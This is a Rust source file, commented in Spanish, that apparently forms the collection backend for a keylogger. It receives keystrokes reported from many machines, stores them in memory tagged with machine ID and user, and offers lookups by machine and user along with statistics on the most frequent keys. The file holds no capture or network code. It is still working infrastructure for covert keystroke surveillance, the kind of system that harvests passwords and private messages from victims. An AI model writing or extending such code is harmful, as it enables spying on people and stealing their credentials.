// src/logs.rs
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use chrono::{DateTime, Utc};
use uuid::Uuid;

// Estructura para una tecla individual
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyData {
    pub id: String,
    pub timestamp: DateTime<Utc>,
    pub key: String,
    pub machine_id: String,
    pub user: String,
}

// Estructura para recibir datos del keylogger (sin ID)
#[derive(Debug, Clone, Deserialize)]
pub struct KeyDataInput {
    pub timestamp: String,
    pub key: String,
    pub machine_id: String,
    pub user: String,
}

// Estadísticas
#[derive(Debug, Serialize)]
pub struct Stats {
    pub total_keys: usize,
    pub machines: HashMap<String, usize>,
    pub users: HashMap<String, usize>,
    pub most_common_keys: Vec<(String, usize)>,
}

// Almacenamiento en memoria
#[derive(Clone)]
pub struct LogStore {
    inner: Arc<Mutex<Vec<KeyData>>>,
}

impl LogStore {
    pub fn new() -> Self {
        Self {
            inner: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn add_key(&self, input: KeyDataInput) -> KeyData {
        let key_data = KeyData {
            id: Uuid::new_v4().to_string(),
            timestamp: input.timestamp.parse().unwrap_or_else(|_| Utc::now()),
            key: input.key,
            machine_id: input.machine_id,
            user: input.user,
        };

        let mut store = self.inner.lock().unwrap();
        store.push(key_data.clone());

        if store.len() > 10000 {
            store.drain(0..1000);
        }

        key_data
    }

    pub fn add_keys_batch(&self, inputs: Vec<KeyDataInput>) -> Vec<KeyData> {
        let mut keys = Vec::new();
        let mut store = self.inner.lock().unwrap();

        for input in inputs {
            let key_data = KeyData {
                id: Uuid::new_v4().to_string(),
                timestamp: input.timestamp.parse().unwrap_or_else(|_| Utc::now()),
                key: input.key,
                machine_id: input.machine_id,
                user: input.user,
            };
            keys.push(key_data.clone());
            store.push(key_data);
        }

        if store.len() > 10000 {
            store.drain(0..1000);
        }

        keys
    }

    pub fn get_all_keys(&self) -> Vec<KeyData> {
        let store = self.inner.lock().unwrap();
        store.clone()
    }

    pub fn get_key_by_id(&self, id: &str) -> Option<KeyData> {
        let store = self.inner.lock().unwrap();
        store.iter().find(|k| k.id == id).cloned()
    }

    pub fn get_stats(&self) -> Stats {
        let store = self.inner.lock().unwrap();
        let mut machines = HashMap::new();
        let mut users = HashMap::new();
        let mut key_counts = HashMap::new();

        for key in store.iter() {
            *machines.entry(key.machine_id.clone()).or_insert(0) += 1;
            *users.entry(key.user.clone()).or_insert(0) += 1;
            *key_counts.entry(key.key.clone()).or_insert(0) += 1;
        }

        let mut most_common: Vec<(String, usize)> = key_counts.into_iter().collect();
        most_common.sort_by(|a, b| b.1.cmp(&a.1));
        most_common.truncate(10);

        Stats {
            total_keys: store.len(),
            machines,
            users,
            most_common_keys: most_common,
        }
    }

    pub fn clear(&self) -> usize {
        let mut store = self.inner.lock().unwrap();
        let len = store.len();
        store.clear();
        len
    }

    pub fn get_keys_by_machine(&self, machine_id: &str) -> Vec<KeyData> {
        let store = self.inner.lock().unwrap();
        store
            .iter()
            .filter(|k| k.machine_id == machine_id)
            .cloned()
            .collect()
    }

    pub fn get_keys_by_user(&self, user: &str) -> Vec<KeyData> {
        let store = self.inner.lock().unwrap();
        store
            .iter()
            .filter(|k| k.user == user)
            .cloned()
            .collect()
    }
}
